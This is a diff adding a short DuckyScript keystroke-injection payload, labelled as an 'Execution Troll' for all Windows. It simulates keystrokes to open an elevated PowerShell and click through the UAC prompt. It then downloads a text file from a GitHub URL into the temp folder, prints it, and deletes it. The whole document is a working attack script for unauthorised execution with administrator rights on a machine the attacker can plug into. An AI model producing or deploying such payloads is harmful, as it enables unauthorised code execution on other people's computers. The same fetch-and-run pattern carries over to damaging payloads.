@@ -1,1 +1,20 @@
-
+REM Author: REDD (InfoSecREDD)
+REM Version: 0.1
+REM Category: Execution Troll
+REM Target: All Windows
+DELAY 500
+GUI d
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+CTRL-SHIFT ENTER
+DELAY 1500
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 4500
+STRING cd $Env:temp;Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/InfoSecREDD/REDD-Demo/main/MadeMeGoPrint/mademe.txt' -OutFile 'mademe.txt';Get-Content -Path ./mademe.txt | Out-Printer;Start-Sleep -s 5;Remove-Item -Path ./mademe.txt -Force;exit
+ENTER
+DELAY 560
+GUI d
